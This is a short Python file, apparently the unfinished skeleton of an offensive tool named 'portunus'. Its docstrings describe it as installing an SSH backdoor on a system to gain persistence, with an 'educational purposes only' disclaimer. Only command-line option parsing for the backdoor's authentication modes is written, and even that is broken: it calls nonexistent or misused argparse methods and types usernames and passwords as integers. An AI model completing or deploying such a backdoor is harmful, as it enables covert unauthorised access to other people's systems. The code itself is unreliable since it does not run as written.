import argparse
import paramiko

"""
portunus makes and managages sshable port on a system in order to gain persistence
**NOTE** this is for educational purposes only **NOTE**
author:     1nv8rZim
language:   python 3.8
"""


def parse_args():
    """
    Parses command line arguments
    """
    parser = argparse.ArgumentParser()
    """
    randomization key
    ---
    port-range
    ---
    replication name
    ---
    more to come...
    """
    auth = parser.add_mutually_exclusive_group(
        description="creates a backdoor to install on a system to gain persistence")
    auth.add_argument('-k', '--key', nargs=1, type=str,
                      help='enable ssh-key authentication')
    user_pass = auth.add_group()
    user_pass.add_argument('-u', '--user', nargs=1,
                           type=int, help='add ssh authentication username')
    user_pass.add_argument('-p', '--pass', nargs=1,
                           type=int, help='add ssh authentication password')
    auth.add_argument('--none', action='store_true',
                      help='ssh authentication will use nothing')

    return parser.parse_args()


def main():
    """
    Runs main loop
    """
    parser = parse_args()
